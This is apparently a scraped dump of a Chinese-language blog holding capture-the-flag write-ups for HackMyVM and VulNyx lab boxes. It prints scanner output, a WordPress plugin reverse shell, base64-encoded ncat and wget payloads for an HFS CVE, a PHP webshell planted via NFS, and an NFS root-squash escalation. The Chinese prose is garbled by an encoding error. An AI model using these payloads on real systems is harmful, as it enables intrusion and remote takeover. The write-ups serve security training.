https://wpscan.com/vulnerability/31ef60db-4847-4623-a194-8722e668e6ab\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0308\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/e3e5bb98-2652-499a-b8cd-4ebfe1c1d890\r|\r| [!] Title: Ultimate Member \u0026lt; 2.10.0 - Authenticated SQL Injection\r| Fixed in: 2.10.0\r| References:\r| - https://wpscan.com/vulnerability/90b5192a-ceee-4612-8e21-2341bae29cad\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12276\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/846f9828-2f1f-4d08-abfb-909b8d634d8a\r|\r| [!] Title: Ultimate Member \u0026lt; 2.10.1 - Unauthenticated SQLi\r| Fixed in: 2.10.1\r| References:\r| - https://wpscan.com/vulnerability/1d39ff72-1178-4812-be55-9bf4b58bbbb6\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1702\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/34adbae5-d615-4f8d-a845-6741d897f06c\r|\r| Version: 2.8.6 (100% confidence)\r| Found By: Readme - Stable Tag (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\r| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\r[+] wp-automatic\r| Location: http://mamushka.hmv/wp-content/plugins/wp-automatic/\r| Latest Version: 3.109.2\r| Last Updated: 2025-03-09T10:54:44.000Z\r|\r| Found By: Known Locations (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/wp-automatic/, status: 200\r|\r| [!] 7 vulnerabilities identified:\r|\r| [!] Title: Automatic 2.0.3 - csv.php q Parameter SQL Injection\r| Fixed in: 2.0.4\r| References:\r| - https://wpscan.com/vulnerability/dadc99ca-54ee-42b4-b247-79a47b884f03\r| - https://www.exploit-db.com/exploits/19187/\r| - https://packetstormsecurity.com/files/113763/\r|\r| [!] Title: WordPress Automatic \u0026lt; 3.53.3 - Unauthenticated Arbitrary Options Update\r| Fixed in: 3.53.3\r| References:\r| - https://wpscan.com/vulnerability/4e5202b8-7317-4a10-b9f3-fd6999192e15\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4374\r| - https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/\r|\r| [!] Title: Automatic \u0026lt; 3.92.1 - Cross-Site Request Forgery to Privilege Escalation\r| Fixed in: 3.92.1\r| References:\r| - https://wpscan.com/vulnerability/fa2f3687-7a5f-4781-8284-6fbea7fafd0e\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27955\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/12adf619-4be8-4ecf-8f67-284fc44d87d0\r|\r| [!] Title: Automatic \u0026lt; 3.92.1 - Unauthenticated Arbitrary File Download and Server-Side Request Forgery\r| Fixed in: 3.92.1\r| References:\r| - https://wpscan.com/vulnerability/53b97401-1352-477b-a69a-680b01ef7266\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27954\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/620e8931-64f0-4d9c-9a4c-1f5a703845ff\r|\r| [!] Title: Automatic \u0026lt; 3.92.1 - Unauthenticated SQL Injection\r| Fixed in: 3.92.1\r| References:\r| - https://wpscan.com/vulnerability/53a51e79-a216-4ca3-ac2d-57098fd2ebb5\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27956\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/a8b319be-f312-4d02-840f-e2a91c16b67a\r|\r| [!] Title: WordPress Automatic Plugin \u0026lt; 3.93.0 Cross-Site Request Forgery\r| Fixed in: 3.93.0\r| References:\r| - https://wpscan.com/vulnerability/e5d0dcec-41a7-40ae-b9ce-f839de9c28b8\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32693\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/6231e47e-2120-4746-97c1-2aa80aa18f4e\r|\r| [!] Title: WordPress Automatic \u0026lt; 3.95.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via autoplay Parameter\r| Fixed in: 3.95.0\r| References:\r| - https://wpscan.com/vulnerability/d0198310-b323-476a-adf8-10504383ce1c\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4849\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/4be58bfa-d489-45f5-9169-db8bab718175\r|\r| The version could not be determined. Nuclei #\r[root@kali] /home/kali/Desktop/nuclei â¯ ./nuclei -u http://mamushka.hmv/ â\r__ _\r____ __ _______/ /__ (_)\r/ __ \\/ / / / ___/ / _ \\/ /\r/ / / / /_/ / /__/ / __/ /\r/_/ /_/\\__,_/\\___/_/\\___/_/ v3.3.9\rprojectdiscovery.io\r[INF] Current nuclei version: v3.3.9 (outdated)\r[INF] Current nuclei-templates version: v10.1.3 (latest)\r[WRN] Scan results upload to cloud is disabled.\r[INF] New templates added in latest release: 52\r[INF] Templates loaded for current scan: 7707\r[INF] Executing 7518 signed templates from projectdiscovery/nuclei-templates\r[WRN] Loading 189 unsigned templates for scan. Use with caution.\r[INF] Targets loaded for current scan: 1\r[INF] Templates clustered: 1706 (Reduced 1603 Requests)\r[INF] Using Interactsh Server: oast.site\r[CVE-2024-27956] [http] [critical] http://mamushka.hmv/wp-content/plugins/wp-automatic/inc/csv.php\r[wordpress-login] [http] [info] http://mamushka.hmv/wp-login.php\r[tech-detect:font-awesome] [http] [info] http://mamushka.hmv/\r[tech-detect:php] [http] [info] http://mamushka.hmv/\r[addeventlistener-detect] [http] [info] http://mamushka.hmv/\r[apache-detect] [http] [info] http://mamushka.hmv/ [\u0026#34;Apache/2.4.61 (Debian)\u0026#34;]\r[php-detect] [http] [info] http://mamushka.hmv/ [\u0026#34;8.2.22\u0026#34;]\r[wp-enabled-registration] [http] [info] http://mamushka.hmv/?page_id=14\r[wordpress-detect] [http] [info] http://mamushka.hmv/\r[wp-enabled-registration] [http] [info] http://mamushka.hmv/?page_id=14\r[wp-user-enum:usernames] [http] [low] http://mamushka.hmv/?rest_route=/wp/v2/users/ [\u0026#34;admin\u0026#34;]\r[http-missing-security-headers:strict-transport-security] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:content-security-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:permissions-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:x-frame-options] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:x-content-type-options] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:referrer-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:clear-site-data] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://mamushka.hmv/\r[mixed-passive-content:img] [http] [info] http://mamushka.hmv/ [\u0026#34;http://mamushka.htb/wp-content/uploads/2024/08/mamushka-1.jpg\u0026#34;,\u0026#34;http://mamushka.htb/wp-content/uploads/2024/08/OIG5-1.jpeg\u0026#34;,\u0026#34;http://mamushka.htb/wp-content/uploads/2024/08/OIG4.jpeg\u0026#34;]\r[caa-fingerprint] [dns] [info] mamushka.hmv å¯ä»¥çœ‹åˆ°å­˜åœ¨CVE-2024-27956æ¼æ´\nCVE-2024-27956-RCE #\rä¸‹è½½è„šæœ¬\ndiego-tella/CVE-2024-27956-RCE: PoC for SQL Injection in CVE-2024-27956 ç™»å½•æ¥åˆ°åå°\næˆ‘æœ¬æ¥æƒ³åˆ°å®˜æ–¹æ’ä»¶å¸‚åœºä¸Šä¸‹è½½ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç„¶åä¸Šä¼ ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨å…¶ä»–é¶æœºä¸Šå¯ä»¥æˆåŠŸï¼Œè¿™é‡Œä¸è¡Œã€‚è¿™ä¸ªwordpresså®åœ¨æ˜¯å¤ªå¡äº†ï¼ï¼ï¼\næ‰¾äº†ä¸ªå…¶ä»–çš„webshellä»£ç è¿›è¡Œå‹ç¼©ä¸Šä¼ \n\u0026lt;?php\r/**\r* Plugin Name: Reverse Shell Plugin\r* Plugin URI: * Description: Reverse Shell Plugin for penetration testing.\r* Version: 1.0\r* Author: Security Analyst\r* Author URI: http://www.example.com\r*/\rexec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.104/6666 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;);\r?\u0026gt; å‹ç¼©æˆzipæ–‡ä»¶\n[root@kali] /home/kali/Matrioshka â¯ zip webshell.zip webshell.php adding: webshell.php (deflated 28%) ä¸Šä¼ åï¼Œå…ˆç›‘å¬ç«¯å£ï¼Œå†æ¿€æ´»æ’ä»¶\nUser #\rå‘ç°å­˜åœ¨dockerå®¹å™¨\nå¾ˆæ˜æ˜¾ï¼Œå½“å‰çš„wordpressæ˜¯å¼€åœ¨dockerå®¹å™¨ä¸­çš„ï¼ŒæŠŠå†…ç½‘çš„80ç«¯å£æ˜ å°„åˆ°äº†ä¸»æœºä¸Š\nåœ¨linpeasè¾“å‡ºä¸­å¾—åˆ°äº†wordpressçš„ç”¨æˆ·å¯†ç \nè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”¨æˆ·åä¸­å°‘äº†ä¸€ä¸ª h !!!! å¯¹æ¯”ç½‘ç«™æ ‡é¢˜mamushkaæ‰çŸ¥é“ã€‚\nmatrioshka:Fukurokuju Root #\rå‘ç°è®¸å¤šå¼ ç½‘å¡\ndefault 0.0.0.0 loopback 127.0.0.0\rlink-local 169.254.0.0\rbr-1f21cf17cc68: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 172.18.0.1 netmask 255.255.0.0 broadcast 172.18.255.255\rinet6 fe80::42:37ff:fe92:1872 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 02:42:37:92:18:72 txqueuelen 0 (Ethernet)\rRX packets 546310 bytes 191597700 (182.7 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 493766 bytes 626392335 (597.3 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rbr-4472ca9b655b: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 172.19.0.1 netmask 255.255.0.0 broadcast 172.19.255.255\rinet6 fe80::42:4dff:fe92:8a5a prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 02:42:4d:92:8a:5a txqueuelen 0 (Ethernet)\rRX packets 3648 bytes 215213 (210.1 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 3948 bytes 380378 (371.4 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rdocker0: flags=4099\u0026lt;UP,BROADCAST,MULTICAST\u0026gt; mtu 1500\rinet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255\rether 02:42:92:43:dd:58 txqueuelen 0 (Ethernet)\rRX packets 0 bytes 0 (0.0 B)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 0 bytes 0 (0.0 B)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\renp0s3: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 192.168.56.108 netmask 255.255.255.0 broadcast 192.168.56.255\rinet6 fe80::a00:27ff:fed5:7c4c prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 08:00:27:d5:7c:4c txqueuelen 1000 (Ethernet)\rRX packets 1187558 bytes 620318374 (591.5 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 862178 bytes 196392172 (187.2 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536\rinet 127.0.0.1 netmask 255.0.0.0\rinet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt;\rloop txqueuelen 1000 (Local Loopback)\rRX packets 1029733 bytes 792434531 (755.7 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 1029733 bytes 792434531 (755.7 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rveth011424f: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet6 fe80::d06a:28ff:fe1f:c382 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether d2:6a:28:1f:c3:82 txqueuelen 0 (Ethernet)\rRX packets 143651 bytes 269370121 (256.8 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 168239 bytes 25584006 (24.3 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rveth79812d4: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet6 fe80::d85a:deff:fe35:2d7 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether da:5a:de:35:02:d7 txqueuelen 0 (Ethernet)\rRX packets 8 bytes 565 (565.0 B)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 17 bytes 1539 (1.5 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rvethd4425c2: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet6 fe80::8c9a:93ff:fe89:f449 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 8e:9a:93:89:f4:49 txqueuelen 0 (Ethernet)\rRX packets 714526 bytes 224828236 (214.4 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 637430 bytes 895763382 (854.2 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 æ³¨æ„\né¶æœºå¿…é¡»èƒ½å¤Ÿè®¿é—®å¤–ç½‘ï¼Œä¸ç„¶æ— æ³•æ­£å¸¸å¯åŠ¨å…¶ä¸­çš„å®¹å™¨ï¼ï¼ï¼ï¼\nä¸Šä¼ fscanè¿›è¡Œæ‰«æä¸€ä¸‹ï¼Œå‘ç°172.19.0.2æ˜¯å­˜æ´»çš„\nä½¿ç”¨socatå°†å…¶è½¬å‘å‡ºæ¥\nmatrioshka@matrioshka:/tmp$ ./socat tcp-l:4444,fork,reuseaddr tcp:172.19.0.2:80 \u0026amp; è¿›å…¥åå¯ä»¥ä½¿ç”¨å¼±å£ä»¤admin:adminè¿›è¡Œç™»å½•ï¼Œè¿›å…¥ç®¡ç†é¢æ¿æŸ¥çœ‹åˆ°ç³»ç»Ÿç‰ˆæœ¬\nhfs 0.52.9 vulnerabilities | Snyk\ntruonghuuphuc/CVE-2024-39943-Poc\nå°†**/tmp**ç›®å½•è®¾ç½®ä¸ºä»»ä½•äººå¯ä»¥æ“ä½œ\nå¦‚å›¾æ‰§è¡Œåä¼šåœ¨**/tmp**ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶\nä½†æ˜¯æ— æ³•æ¥æ”¶åˆ°åå¼¹Shellï¼Œè§£ç base64åå‘ç°å¯èƒ½æ˜¯ç›®æ ‡æ— æ³•è®¿é—®åˆ°å¤–ç½‘ã€‚\nbmNhdCAxNzIuMjAuMTgyLjEwNyA2NjY2IC1lIC9iaW4vYmFzaA==\rncat 172.20.182.107 6666 -e /bin/bash å› æ­¤å¯ä»¥æ¢ä¸€ç§æ–¹å¼\ncurl 172.19.0.1:3000\rY3VybCAxNzIuMTkuMC4xOjMwMDA= åŒæ—¶åœ¨POCä»£ç ä¸­å¯ä»¥æ³¨æ„åˆ°ä»–æœ€åè®¿é—®äº†ä¸€ä¸ªè¿™æ ·çš„è·¯å¾„\nä¹‹å‰å¼€æ”¾äº†Anyoneå¯æ“ä½œï¼Œè¿™é‡Œè®¿é—®ä¹‹å‰å¿…é¡»é‡å‘½åä¿å­˜ä¹‹åæ‰è¡Œï¼ï¼ï¼\nå› æ­¤åªéœ€è¦è®¿é—®å¦‚ä¸‹è·¯å¾„å³å¯\nhttp://172.20.189.150:4444/~/api/get_ls?path=/tmp/\u0026lt;payload\u0026gt; åœ¨è¿›è¡Œåå¼¹shellä¹‹å‰ï¼Œéœ€è¦ä¸Šä¼ ä¸€ä¸ªshell.shï¼Œå¯ä»¥ä½¿ç”¨wgetä¼ ä¸Šå»\nwget 172.19.0.1:8000/shell.sh -O /tmp/shell.sh\rd2dldCAxNzIuMTkuMC4xOjgwMDAvc2hlbGwuc2ggLU8gL3RtcC9zaGVsbC5zaA== ç„¶ååå¼¹shell\nbash /tmp/shell.sh\rYmFzaCAvdG1wL3NoZWxsLnNo æŸ¥çœ‹å­˜åœ¨çš„dockerå®¹å™¨\nroot@40b85800163c:/tmp# docker ps -a\rdocker ps -a\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r40b85800163c ubuntu:20.04 \u0026#34;/bin/bash -c \u0026#39;apt-gâ€¦\u0026#34; 2 hours ago Up 2 hours 127.0.0.1:9090-\u0026gt;80/tcp docker-hfs_hfs_1\r8485358c3c48 mysql:8.0.0 \u0026#34;docker-entrypoint.sâ€¦\u0026#34; 6 months ago Up 2 hours 3306/tcp docker-wp_db_1\r3ed5ddfe0e0c wordpress \u0026#34;docker-entrypoint.sâ€¦\u0026#34; 6 months ago Up 2 hours 127.0.0.1:8080-\u0026gt;80/tcp docker-wp_wordpress_1 æŸ¥æ‰¾å¯ä»¥åˆ©ç”¨çš„å‘½ä»¤\nè¿™é‡Œå¦‚æœæ˜¯ç›´æ¥åœ¨åå¼¹shellé‡Œè¿è¡Œçš„è¯ä¼šTTYæŠ¥é”™ï¼Œåªéœ€è¦script /dev/nullå¼€å¯ä¼ªç»ˆç«¯å³å¯\nSummary #\rUserï¼šé€šè¿‡WPscanå’ŒNucleiæ‰«æå‡ºæ¥ä»»æ„ç”¨æˆ·æ³¨å†Œçš„æ¼æ´ï¼Œé€šè¿‡ä¸Šä¼ wpæ’ä»¶è·å¾—åå¼¹shellï¼Œåœ¨ç¯å¢ƒå˜é‡é‡Œå¾—åˆ°sshçš„ç™»å½•å‡­è¯ã€‚\nRootï¼šä½¿ç”¨fscanå¯¹å†…ç½‘ç½‘æ®µè¿›è¡Œæ‰«æï¼Œå¾—åˆ°å­˜æ´»çš„172.19.0.2ã€‚é€šè¿‡å¼±å£ä»¤ç™»å½•åˆ°åå°ï¼ŒæŸ¥çœ‹åˆ°æœåŠ¡ç‰ˆæœ¬å·ã€‚ç»è¿‡æœç´¢æŸ¥æ‰¾åˆ°CVE-2024-39943ï¼Œè„šæœ¬å¹¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œä¸è¿‡æ ¹æ®ä»£ç é€»è¾‘å¯ä»¥æ‰¾åˆ°åˆ©ç”¨çš„URLè·¯å¾„ï¼Œè‰°éš¾åœ°åå¼¹åˆ°shellåæŸ¥çœ‹åˆ°å­˜åœ¨å¦å¤–å‡ ä¸ªDockerå®¹å™¨ï¼Œè¿›å…¥åˆ°ubuntué‡Œé¢æ‹¿åˆ°root.txtã€‚\n","date":"2025-03-10","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-matrioshka/","section":"Posts","summary":"","title":"HackMyVM-Matrioshka","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Low Nmap #\r[root@kali] /home/kali/Lower3 â¯ nmap 192.168.56.113 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\r| ssh-hostkey: | 3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)\r| 256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)\r|_ 256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)\r80/tcp open http Apache httpd 2.4.56 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.56 (Debian)\r111/tcp open rpcbind 2-4 (RPC #100000)\r| rpcinfo: | program version port/proto service\r| 100000 2,3,4 111/tcp rpcbind\r| 100000 2,3,4 111/udp rpcbind\r| 100000 3,4 111/tcp6 rpcbind\r| 100000 3,4 111/udp6 rpcbind\r| 100003 3 2049/udp nfs\r| 100003 3 2049/udp6 nfs\r| 100003 3,4 2049/tcp nfs\r| 100003 3,4 2049/tcp6 nfs\r| 100005 1,2,3 36141/tcp mountd\r| 100005 1,2,3 46793/udp mountd\r| 100005 1,2,3 56285/tcp6 mountd\r| 100005 1,2,3 57285/udp6 mountd\r| 100021 1,3,4 37329/tcp6 nlockmgr\r| 100021 1,3,4 39713/tcp nlockmgr\r| 100021 1,3,4 41715/udp nlockmgr\r| 100021 1,3,4 58173/udp6 nlockmgr\r| 100227 3 2049/tcp nfs_acl\r| 100227 3 2049/tcp6 nfs_acl\r| 100227 3 2049/udp nfs_acl\r|_ 100227 3 2049/udp6 nfs_acl\r2049/tcp open nfs 3-4 (RPC #100003)\r36141/tcp open mountd 1-3 (RPC #100005)\r38315/tcp open mountd 1-3 (RPC #100005)\r39713/tcp open nlockmgr 1-4 (RPC #100021)\r41871/tcp open mountd 1-3 (RPC #100005)\rMAC Address: 08:00:27:C5:C6:B4 (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NFS #\rå‘ç°äº† NFSï¼ˆNetwork File Systemï¼‰ å…±äº«ï¼Œå¯èƒ½å­˜åœ¨å¯æŒ‚è½½çš„è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿã€‚ mountdã€nlockmgrã€nfs_acl è¿™äº› RPC ç«¯å£ä¹Ÿè¢«å‘ç°ï¼Œè¡¨æ˜æœåŠ¡å™¨å¯èƒ½å…è®¸è¿œç¨‹æ–‡ä»¶è®¿é—®ã€‚\n[root@kali] /home/kali â¯ showmount -e 192.168.56.113 â\rExport list for 192.168.56.113:\r/var/www/html * ç›®æ ‡æœºå™¨é€šè¿‡ NFSï¼ˆNetwork File Systemï¼‰ å…±äº«äº† /var/www/html ç›®å½•ï¼Œå¹¶ä¸”å¯¹æ‰€æœ‰ä¸»æœºå¼€æ”¾æŒ‚è½½æƒé™ã€‚\nå› æ­¤å¯ä»¥ä¸Šä¼ ä¸€ä¸ªWebshell\n[root@kali] /home/kali â¯ mkdir /mnt/nfs\r[root@kali] /home/kali â¯ mount -t nfs 192.168.56.113:/var/www/html /mnt/nfs\r[root@kali] /mnt/nfs â¯ echo \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; \u0026gt; shell.php ç„¶ååå¼¹åˆ°shell\nç›´æ¥è¿›å…¥ç”¨æˆ·ç›®å½•æ‹¿åˆ°user.txt\nRoot #\rä»ç„¶æ˜¯é€šè¿‡NFSæ¥ææƒ\nå…¶ä¸­no_root_squashé…ç½®è¡¨ç¤ºï¼šç™»å…¥ NFS ä¸»æœºä½¿ç”¨åˆ†äº«ç›®å½•çš„ä½¿ç”¨è€…ï¼Œå¦‚æœæ˜¯ root çš„è¯ï¼Œé‚£ä¹ˆå¯¹äºè¿™ä¸ªåˆ†äº«çš„ç›®å½•æ¥è¯´ï¼Œä»–å°±å…·æœ‰ root çš„æƒé™ï¼\nä¸‹é¢æ˜¯ä¸¤ä¸ªå‚è€ƒçš„æ–‡ç« \nLinux ææƒ-NFS å…±äº« - æ‰›æªçš„ä¹¦ç”Ÿ - åšå®¢å›­\nLinuxææƒå§¿åŠ¿äºŒï¼šåˆ©ç”¨NFSææƒ-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘\né¦–å…ˆåœ¨lowæœºå™¨ä¸ŠæŠŠbashæ‹·è´åˆ°å½“å‰ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°å½“å‰çš„æ‹¥æœ‰è€…æ˜¯low\nå›åˆ°kaliï¼Œç”±äºæˆ‘ä»¬æ˜¯ç”±rootèº«ä»½è¿›è¡ŒæŒ‚è½½çš„ï¼Œå› æ­¤å¯¹å½“å‰ç›®å½•æ¥è¯´æˆ‘ä»¬å°±æ˜¯rootï¼\nåªéœ€è¦ä¿®æ”¹ä¸€ä¸‹æ‹¥æœ‰è€…ï¼Œç„¶åèµ‹äºˆå¯åŠ¨æƒé™å³å¯ã€‚\næœ€åå¯åŠ¨bash -på³å¯æå‡åˆ°root\nSummary #\rè¿™ä¸ªé¶æœºæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯é€šè¿‡NFSæ¥è·å–åˆ°lowç”¨æˆ·ï¼Œå†é€šè¿‡kaliçš„rootæŒ‚è½½ï¼Œæå‡åˆ°rootæƒé™ï¼Œå°±ä¸å¤šè¯´äº†ã€‚\n","date":"2025-03-10","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-lower3/","section":"Posts","summary":"","title":"VulNyx-Lower3","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/debian â¯ nmap 192.168.237.155 -sV -A -p- -T4\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 92:6e:6d:b0:bd:08:1e:db:9d:56:0e:f8:15:25:ca:21 (ECDSA)\r|_ 256 88:d7:08:bd:a2:95:75:cc:71:06:47:ae:fd:d3:8b:b9 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: PHPJabbers.com | Free Food Store Website Template\rMAC Address: 00:0C:29:0A:FF:81 (VMware)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ParamScan #\rè®¿é—®80ç«¯å£ï¼Œåœ¨ç½‘é¡µæ³¨é‡Šä¸­å‘ç°å­˜åœ¨GETå‚æ•°\nä½¿ç”¨ffufå¯¹å‚æ•°è¿›è¡Œçˆ†ç ´ï¼Œå‘ç°å­˜åœ¨hackå‚æ•°å¯ä»¥æ§åˆ¶ï¼Œä½†æ˜¯å¹¶ä¸èƒ½åŒ…å«**/etc/passwd**æ–‡ä»¶\n[root@kali] /home/kali/debian â¯ ffuf -u \u0026#34;http://192.168.237.155/index.php?FUZZ=1\u0026#34; -w ../Desktop/fuzzDicts/paramDict/AllParam.txt -fs 18852\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.237.155/index.php?FUZZ=1\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 18852\r________________________________________________\rhack [Status: 200, Size: 18864, Words: 6832, Lines: 377, Duration: 43ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 4347 req/sec :: Duration: [0:00:17] :: Errors: 0 :: Gobuster #\rå°è¯•åˆ—ä¸¾ç½‘ç«™ç›®å½•ä¸‹çš„å…¶ä»–æ–‡ä»¶\n[root@kali] /home/kali/debian â¯ gobuster dir -u http://192.168.237.155 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.237.155\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 280]\r/index.php (Status: 200) [Size: 18852]\r/products.php (Status: 200) [Size: 12163]\r/terms.php (Status: 200) [Size: 6670]\r/assets (Status: 301) [Size: 319] [--\u0026gt; http://192.168.237.155/assets/]\r/testimonials.php (Status: 200) [Size: 7907]\r/contact.php (Status: 200) [Size: 8853]\r/about.php (Status: 200) [Size: 10036]\r/javascript (Status: 301) [Size: 323] [--\u0026gt; http://192.168.237.155/javascript/]\r/checkout.php (Status: 200) [Size: 13307]\r/blog.php (Status: 200) [Size: 9782]\r/secret.php (Status: 200) [Size: 2187]\r/.php (Status: 403) [Size: 280]\r/server-status (Status: 403) 